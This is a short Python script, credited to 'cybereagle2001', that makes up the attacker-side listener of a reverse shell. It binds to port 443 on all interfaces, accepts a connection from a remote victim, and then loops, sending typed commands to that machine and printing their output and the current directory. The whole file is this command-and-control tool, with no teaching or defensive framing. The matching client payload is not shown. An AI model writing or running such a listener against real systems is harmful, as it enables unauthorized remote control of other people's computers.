#coded by cybereagle2001

import socket 

server_host= "0.0.0.0"
server_port= 443
data_size = 1024 * 128
SEPARATOR = "<sep>"
cyber = socket.socket()
cyber.bind((server_host,server_port))
cyber.listen(10)
print("started listening on the ",server_host," port number: ",server_port,"..\n")
client_socket,client_ip = cyber.accept()
print(f"{client_ip[0]}:{client_ip[1]} Connected!")
cmd = client_socket.recv(data_size).decode()
print("[+] Current working directory:", cmd)
while True:
    command = input(f"{cmd}~$ ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    output = client_socket.recv(data_size).decode()
    results,cmd = output.split(SEPARATOR)
    print(results)
